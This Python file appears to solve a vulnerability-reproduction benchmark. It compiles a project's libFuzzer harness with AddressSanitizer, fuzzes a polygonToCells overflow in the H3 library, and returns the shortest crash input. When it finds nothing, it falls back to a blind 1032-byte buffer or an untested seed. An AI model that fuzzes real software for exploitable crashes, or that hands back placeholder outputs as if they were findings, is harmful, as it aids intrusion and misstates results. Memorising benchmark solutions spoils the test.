import os
import sys
import subprocess
import tempfile
import shutil
import struct
import glob

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        Args:
            src_path: Path to the vulnerable source code tarball
        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        tmp_dir = tempfile.mkdtemp()
        try:
            # 1. Extract the source code
            subprocess.check_call(['tar', '-xf', src_path, '-C', tmp_dir], stderr=subprocess.DEVNULL)
            
            # 2. Locate source files and the fuzz target
            c_files = []
            include_dirs = set()
            fuzz_target = None
            
            for root, dirs, files in os.walk(tmp_dir):
                include_dirs.add(root)
                for f in files:
                    path = os.path.join(root, f)
                    # Look for C/C++ files
                    if f.endswith('.c') or f.endswith('.cc') or f.endswith('.cpp'):
                        try:
                            with open(path, 'r', encoding='utf-8', errors='ignore') as fo:
                                content = fo.read()
                            
                            # Identify fuzz target by the presence of LLVMFuzzerTestOneInput
                            if 'LLVMFuzzerTestOneInput' in content:
                                fuzz_target = path
                            # Exclude files with 'main' to avoid linker errors (tests, tools),
                            # unless it's the fuzz target itself (rare for libFuzzer targets)
                            elif 'main' in content:
                                continue
                            elif f.endswith('.c'):
                                c_files.append(path)
                        except IOError:
                            pass

            if not fuzz_target:
                # Fallback: if we can't find it, we can't compile. 
                # Return a large buffer to attempt a blind crash or just satisfy return type.
                return b'A' * 1032

            # 3. Compile the fuzzer
            # Use clang with AddressSanitizer and LibFuzzer
            bin_path = os.path.join(tmp_dir, 'fuzzer_bin')
            cmd = [
                'clang', 
                '-fsanitize=address,fuzzer', 
                '-O2', 
                '-g', 
                '-lm' # Link math library common in geometry libs
            ]
            
            for inc in include_dirs:
                cmd.extend(['-I', inc])
            
            cmd.append(fuzz_target)
            cmd.extend(c_files)
            cmd.extend(['-o', bin_path])
            
            # Compile, suppressing output
            comp_res = subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            if comp_res.returncode != 0 or not os.path.exists(bin_path):
                # Compilation failed
                return b'A' * 1032

            # 4. Prepare Corpus
            corpus_dir = os.path.join(tmp_dir, 'corpus')
            work_dir = os.path.join(tmp_dir, 'work')
            os.makedirs(corpus_dir, exist_ok=True)
            os.makedirs(work_dir, exist_ok=True)

            # Generate seeds to accelerate fuzzing
            # Vulnerability is "under-estimation" in polygonToCells.
            # Target length ~1032 bytes implies ~64 vertices (16 bytes each + header).
            # Structure: [Resolution (int)] [Count (int)] [Coord Pairs...]
            
            # Seed 1: 64 vertices, small polygon
            n_verts = 64
            # Resolution 9 (valid H3 resolution)
            seed_data = struct.pack('<i', 9) + struct.pack('<i', n_verts)
            for i in range(n_verts):
                seed_data += struct.pack('<dd', 37.7 + i*0.001, -122.4 + i*0.001)
            
            with open(os.path.join(corpus_dir, 'seed1'), 'wb') as f:
                f.write(seed_data)

            # 5. Run Fuzzer
            # We use a timeout to limit execution time.
            # artifact_prefix directs crashes to work_dir.
            run_cmd = [
                bin_path,
                corpus_dir,
                '-max_total_time=45',
                '-rss_limit_mb=4096',
                '-artifact_prefix=' + os.path.join(work_dir, 'crash-')
            ]
            
            try:
                subprocess.run(run_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=50)
            except subprocess.TimeoutExpired:
                pass

            # 6. Collect Crashes
            # LibFuzzer names artifacts as prefix-<sha1>
            crashes = glob.glob(os.path.join(work_dir, 'crash-*'))
            crashes += glob.glob(os.path.join(work_dir, 'leak-*'))
            crashes += glob.glob(os.path.join(work_dir, 'oom-*'))

            if not crashes:
                # If no crash found, return the seed as it mimics the structure of the target
                return seed_data

            # 7. Select best PoC
            # Optimization: Shorter PoCs score higher.
            best_crash = None
            min_len = float('inf')

            for c_path in crashes:
                with open(c_path, 'rb') as f:
                    data = f.read()
                    if len(data) < min_len:
                        min_len = len(data)
                        best_crash = data
            
            return best_crash if best_crash is not None else seed_data

        except Exception as e:
            # Fallback in case of runtime error
            return b'A' * 1032
        finally:
            # Cleanup
            shutil.rmtree(tmp_dir, ignore_errors=True)
